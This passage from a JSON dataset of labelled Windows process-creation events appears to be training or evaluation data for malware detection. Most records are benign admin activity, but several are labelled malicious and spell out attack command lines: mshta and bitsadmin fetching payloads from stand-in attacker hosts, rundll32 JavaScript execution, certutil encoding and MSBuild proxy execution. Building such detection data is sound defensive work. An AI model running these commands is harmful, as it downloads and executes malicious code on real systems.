    "UtcTime": "2024-07-05T08:50:23.718Z",
    "ProcessGuid": "{433B9D76-7C0D-476A-9EC0-1074D8682A9B}",
    "ProcessId": 59687,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Disk | Get-Partition | Get-Volume\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 54234,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:46:53.572Z",
    "ProcessGuid": "{E2F19849-B6BD-4879-9003-BAEC90D16C1B}",
    "ProcessId": 60966,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\agarwal\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 39203,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:20:07.007Z",
    "ProcessGuid": "{E5448FB0-3624-4C1C-A121-05B85AA6850D}",
    "ProcessId": 33596,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 49956,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:23:44.689Z",
    "ProcessGuid": "{10A7BCE9-C15D-46E2-9FB2-528925C10230}",
    "ProcessId": 64120,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\\Reports\\servers.csv\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 46239,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T18:21:03.345Z",
    "ProcessGuid": "{A79F8EA2-5616-4B72-B364-DCB6F7FC57AA}",
    "ProcessId": 52627,
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"http://stager6379.net/script812.hta\"\"\")",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 48252,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.005",
    "technique_name": "Mshta Remote HTA",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T01:53:08.182Z",
    "ProcessGuid": "{B671BE8B-4617-4493-8B78-F93625F8677A}",
    "ProcessId": 58245,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 3049,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:55:23.840Z",
    "ProcessGuid": "{BF85C016-B843-4C02-9982-76A43AA799B3}",
    "ProcessId": 4683,
    "Image": "C:\\Users\\sysadmin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 34768,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T01:27:38.266Z",
    "ProcessGuid": "{63E8066A-1F8A-435A-A74C-B149C6CD84AD}",
    "ProcessId": 10781,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -encode C:\\Users\\Public\\decoded476.exe C:\\Users\\Public\\encoded439.txt",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 6836,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T11:14:44.898Z",
    "ProcessGuid": "{B179B3DC-90DD-47C8-8C07-9EF4C08EBF8F}",
    "ProcessId": 23567,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_4.0.86.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 21453,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T17:53:42.308Z",
    "ProcessGuid": "{12681665-B66A-4D51-991D-4C75CC3B5AF3}",
    "ProcessId": 33148,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 52767,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T01:37:50.707Z",
    "ProcessGuid": "{517B5CA0-CC96-415A-9946-5E8F10CD5345}",
    "ProcessId": 32147,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 46115,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T11:33:58.810Z",
    "ProcessGuid": "{64F90951-C10B-479E-8675-723C3877D906}",
    "ProcessId": 24674,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 26434,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T02:55:49.310Z",
    "ProcessGuid": "{9BB3C456-218B-4BB3-B985-4476A30EA859}",
    "ProcessId": 58979,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job2051 /download http://beacon-drop299.com/files/installer902.exe C:\\Users\\Public\\installer461.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 47272,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T08:48:42.385Z",
    "ProcessGuid": "{9C64DEB8-0532-4458-BBCC-ABF9C5957AD1}",
    "ProcessId": 56640,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 49370,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T03:34:22.987Z",
    "ProcessGuid": "{957361D0-54CD-4A8E-B919-6E918A75D16F}",
    "ProcessId": 51484,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 14607,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T06:14:08.158Z",
    "ProcessGuid": "{3BFB26F3-AFD9-4F3B-AC7A-18ABDAE25BF7}",
    "ProcessId": 6057,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 20385,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T06:26:44.567Z",
    "ProcessGuid": "{C1CC3721-FD35-4D0A-8A14-FFFB3FE5F119}",
    "ProcessId": 48319,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 61658,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T12:17:03.570Z",
    "ProcessGuid": "{6EF00C51-EDE6-4F6E-BB70-FA828F280670}",
    "ProcessId": 63162,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 39775,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T12:15:46.640Z",
    "ProcessGuid": "{AE143977-FC2C-4558-A4C9-912773A54384}",
    "ProcessId": 33492,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Test-Connection -ComputerName fileserver -Count 4\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 39915,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:29:24.276Z",
    "ProcessGuid": "{53276E61-CCE8-43BC-B724-E04B40FC4E4D}",
    "ProcessId": 61646,
    "Image": "C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe",
    "CommandLine": "Teams.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 42943,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:47:30.942Z",
    "ProcessGuid": "{C1D66C2D-11EC-46D3-8B21-A8061065A54C}",
    "ProcessId": 18601,
    "Image": "C:\\Users\\admin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 59787,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:21:27.835Z",
    "ProcessGuid": "{6ABB3463-ECDB-462C-B71E-8F340CFBABDF}",
    "ProcessId": 54971,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Restart-Service -Name Spooler -Force\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 57328,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:43:56.936Z",
    "ProcessGuid": "{223A95E5-4469-4D8A-B343-5EBDB1058E03}",
    "ProcessId": 64266,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53102,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:14:24.091Z",
    "ProcessGuid": "{B829FE9C-97E5-438E-9AD8-26D8217361B8}",
    "ProcessId": 48891,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter *\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53819,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T17:51:07.815Z",
    "ProcessGuid": "{D1A12DA7-4B98-45B6-93AE-C51146B38DCF}",
    "ProcessId": 65477,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 38088,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T15:19:15.214Z",
    "ProcessGuid": "{44285EA9-8269-4938-95B8-7C99AB335C9E}",
    "ProcessId": 37492,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe printui.dll,PrintUIEntry /in /n \\\\printserver\\HP_LaserJet",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 4083,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T16:16:56.550Z",
    "ProcessGuid": "{182563BA-2022-453A-AF7C-1D7C8F61E1D4}",
    "ProcessId": 54290,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe https://sharepoint.corp.local/sites/team",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentProcessId": 52995,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:43:10.178Z",
    "ProcessGuid": "{68986ADE-6754-431B-81FE-3845D1625F84}",
    "ProcessId": 55260,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 57325,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T23:44:12.730Z",
    "ProcessGuid": "{FB18DF8C-FC76-436A-BFA5-F3E90B3E3BBD}",
    "ProcessId": 21428,
    "Image": "C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe",
    "CommandLine": "Teams.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 27148,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T19:45:04.013Z",
    "ProcessGuid": "{A6D6BCAF-09BE-439C-85D8-E90DAA128712}",
    "ProcessId": 61962,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 61360,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T20:43:34.161Z",
    "ProcessGuid": "{3E388AC0-F873-497B-A2DF-1D259C036FAF}",
    "ProcessId": 5840,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 29949,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T06:48:10.510Z",
    "ProcessGuid": "{F3BA1703-9BE2-4C69-A36B-CEC4E9CE9013}",
    "ProcessId": 34733,
    "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "CommandLine": "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 31593,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T22:57:23.469Z",
    "ProcessGuid": "{1D9BCCD3-5A64-40F7-B89B-88AE99D60204}",
    "ProcessId": 64868,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 50014,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:09:20.882Z",
    "ProcessGuid": "{7EE8E31B-B353-42E2-9C23-C3BF18E5D7F0}",
    "ProcessId": 48078,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 21926,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:44:07.654Z",
    "ProcessGuid": "{FAEFD8CD-1B97-445A-844F-D5472E59CEA6}",
    "ProcessId": 61039,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c gpupdate /force",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 62645,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T04:39:59.164Z",
    "ProcessGuid": "{0C9EA3D1-9DEB-43A0-BD5B-E8BB8D740F35}",
    "ProcessId": 47649,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c runtime233.exe\")",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 36082,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.011",
    "technique_name": "Rundll32 JavaScript",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-07T02:37:05.932Z",
    "ProcessGuid": "{9FFDACC5-CF89-4047-93D0-ED2CDC8C6D94}",
    "ProcessId": 46088,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\installer100.csproj",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 5292,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
